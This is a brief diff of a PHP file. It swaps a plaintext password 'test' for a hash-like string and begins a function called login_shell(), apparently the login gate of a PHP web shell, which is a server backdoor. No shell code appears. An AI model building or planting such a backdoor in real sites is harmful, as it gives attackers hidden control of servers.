@@ -1,6 +1,6 @@
 <?php
 session_start();
-$password = "test";
+$password = "76fdd00d9db694259b003d95f9dd66cc";
 
 function login_shell()
 {
